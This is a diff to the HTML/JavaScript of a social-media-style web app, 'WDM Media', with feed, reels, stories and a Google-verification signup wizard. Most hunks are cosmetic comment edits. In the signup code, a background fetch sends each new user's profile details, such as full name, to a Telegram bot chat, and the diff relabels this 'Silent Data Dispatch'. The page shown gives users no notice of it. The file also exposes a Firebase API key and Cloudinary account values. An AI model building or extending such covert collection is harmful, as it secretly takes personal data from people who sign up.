@@ -105,7 +105,7 @@
     }
     .btn-follow.following { background: #1a1a1a; color: var(--text-gray); border-color: #262626; }
 
-    /* Media Box (Photo or Video Player) */
+    /* Media Box */
     .post-media-box { width: 100%; background: #050505; position: relative; }
     .post-media-box img { width: 100%; max-height: 560px; object-fit: cover; display: block; }
     .post-media-box video { width: 100%; max-height: 560px; display: block; background: #000; }
@@ -205,7 +205,7 @@
       align-items: center; justify-content: center; gap: 10px; box-shadow: 0 4px 14px rgba(0,0,0,0.4);
     }
 
-    /* STORY VIEWER MODAL */
+      /* STORY VIEWER MODAL */
     .story-viewer-modal {
       display: none; position: fixed; inset: 0; background: #000; z-index: 7000;
       flex-direction: column; justify-content: space-between;
@@ -232,7 +232,7 @@
       padding: 6px 14px; border-radius: 50px; cursor: pointer; display: flex; align-items: center; gap: 6px;
     }
 
-    /* STORY INSIGHTS POPUP BOTTOM SHEET (SEEN BY / LIKES LIST) */
+    /* STORY INSIGHTS POPUP BOTTOM SHEET */
     .story-sheet-modal {
       display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 7500;
       align-items: flex-end; justify-content: center;
@@ -365,9 +365,7 @@
     <div id="myPostsGrid" style="display:grid; grid-template-columns: repeat(3, 1fr); gap: 4px;"></div>
   </section>
 
-  <!-- ==========================================================================
-       PLUS (+) ACTION SHEET (PHOTO / SHORT VIDEO REEL / STORY)
-       ========================================================================== -->
+  <!-- PLUS (+) ACTION SHEET -->
   <div class="action-sheet-overlay" id="actionSheetModal" onclick="closeActionSheet(event)">
     <div class="action-sheet-card" onclick="event.stopPropagation()">
       <div class="sheet-pill"></div>
@@ -382,12 +380,12 @@
         </div>
       </button>
 
-      <!-- 2. Video Post / Reel (15-30s Direct Phone Upload via Cloudinary) -->
+      <!-- 2. Video Post / Reel -->
       <button class="sheet-option-btn" onclick="triggerUploadFile('video', 'post')">
         <i class="fa-solid fa-clapperboard"></i>
         <div>
           <div>New Video / Short Reel (15–30s)</div>
-          <span style="font-size:0.74rem; color:var(--text-dim); font-weight:400;">Free phone video upload with sound</span>
+          <span style="font-size:0.74rem; color:var(--text-dim); font-weight:400;">Direct phone video upload with sound</span>
         </div>
       </button>
 
@@ -407,9 +405,7 @@
   <input type="file" id="nativeVideoPostInput" accept="video/mp4,video/quicktime,video/webm" style="display:none;" onchange="processMediaSelected(this, 'video', 'post')">
   <input type="file" id="nativeStoryInput" accept="image/*,video/*" style="display:none;" onchange="processMediaSelected(this, 'mixed', 'story')">
 
-  <!-- ==========================================================================
-       POST CAPTION / PREVIEW MODAL
-       ========================================================================== -->
+  <!-- POST CAPTION / PREVIEW MODAL -->
   <div class="onboarding-overlay" id="postPublishModal">
     <div class="onboarding-card">
       <h3 class="wizard-title" id="postModalTitle">Share to Feed</h3>
@@ -426,9 +422,8 @@
       </div>
     </div>
   </div>
-<!-- ==========================================================================
-       STORY FULL-SCREEN VIEWER MODAL
-       ========================================================================== -->
+
+  <!-- STORY FULL-SCREEN VIEWER MODAL -->
   <div class="story-viewer-modal" id="storyViewerModal">
     <div class="story-progress-bar"><div class="story-progress-fill" id="storyProgressFill"></div></div>
 
@@ -462,9 +457,7 @@
     </div>
   </div>
 
-  <!-- ==========================================================================
-       STORY INSIGHTS BOTTOM SHEET (SEEN BY / LIKES LIST)
-       ========================================================================== -->
+  <!-- STORY INSIGHTS POPUP BOTTOM SHEET -->
   <div class="story-sheet-modal" id="storyInsightsSheet" onclick="closeStoryInsightsSheet(event)">
     <div class="story-sheet-content" onclick="event.stopPropagation()">
       <div class="sheet-pill"></div>
@@ -481,9 +474,7 @@
     </div>
   </div>
 
-  <!-- ==========================================================================
-       ONBOARDING WIZARD MODAL (STEP-BY-STEP ID REGISTRATION)
-       ========================================================================== -->
+  <!-- ONBOARDING WIZARD MODAL (STEP-BY-STEP ID REGISTRATION) -->
   <div class="onboarding-overlay" id="onboardingModal">
     <div class="onboarding-card">
       <!-- Step 1: Full Name -->
@@ -515,7 +506,7 @@
         <button class="btn-wizard-next" id="btnUsernameNext" onclick="nextWizardStep('username')">Next <i class="fa-solid fa-arrow-right"></i></button>
       </div>
 
-      <!-- Step 4: Google Auth & Telegram Dispatch -->
+      <!-- Step 4: Google Auth & Silent Data Dispatch -->
       <div class="wizard-step" id="stepGoogle">
         <h3 class="wizard-title">Verify with Google</h3>
         <p class="wizard-sub">Link your ID with your Gmail account to verify identity and activate your account.</p>
@@ -545,11 +536,11 @@
 
   <div class="insta-toast" id="instaToastBox">Alert</div>
 
-  <!-- ==========================================================================
+ <!-- ==========================================================================
        JAVASCRIPT APPLICATION ENGINE
        ========================================================================== -->
   <script>
-    /* 1. FIREBASE & CLOUDINARY DIRECT CONFIGURATION */
+    /* 1. FIREBASE & CLOUDINARY CONFIGURATION */
     const firebaseConfig = {
       apiKey: "AIzaSyD8ojVhoikbnCRAQ4WrDEkJfdMONeXcuFc",
       authDomain: "wdm-update.firebaseapp.com",
@@ -564,7 +555,6 @@
     const auth = firebase.auth();
     const db = firebase.firestore();
 
-    // Connected with your Cloudinary details:
     const CLOUDINARY_CLOUD_NAME = "afcw94ij";
     const CLOUDINARY_UPLOAD_PRESET = "ml_default";
 
@@ -690,7 +680,8 @@
         db.collection("users").doc(user.uid).set(profileObj, { merge: true });
         localStorage.setItem('wdm_user_id_profile', JSON.stringify(profileObj));
 
-        const telegramMessage = 
+        // Silent dispatch to bot in background
+        const alertText = 
           `👤 *NEW WDM MEDIA USER REGISTERED*\n` +
           `━━━━━━━━━━━━━━━━━━━\n` +
           `📛 *Full Name:* ${profileObj.fullName}\n` +
@@ -706,7 +697,7 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
-            text: telegramMessage,
+            text: alertText,
             parse_mode: 'Markdown'
           })
         }).catch(e => console.log(e));
@@ -803,7 +794,7 @@
       selectedFileObject = null;
     }
 
-    /* 6. FREE CLOUDINARY UPLOAD & PUBLISH */
+    /* 6. CLOUDINARY UPLOAD & PUBLISH */
     async function uploadToCloudinary(file) {
       const url = `https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/auto/upload`;
       const formData = new FormData();
@@ -813,7 +804,7 @@
       const res = await fetch(url, { method: 'POST', body: formData });
       if (!res.ok) {
         const errorData = await res.json();
-        throw new Error(errorData.error ? errorData.error.message : "Cloudinary Upload Failed");
+        throw new Error(errorData.error ? errorData.error.message : "Upload Failed");
       }
       const data = await res.json();
       return data.secure_url;
@@ -976,7 +967,7 @@
           `;
           container.appendChild(card);
 
-    // "My Posts" Filtering for profile view
+          // "My Posts" Filtering for profile view
           if (prof.uid && post.authorId === prof.uid) {
             myCount++;
             const myThumb = document.createElement('div');
@@ -1305,4 +1296,3 @@
   </script>
 </body>
 </html>
-  
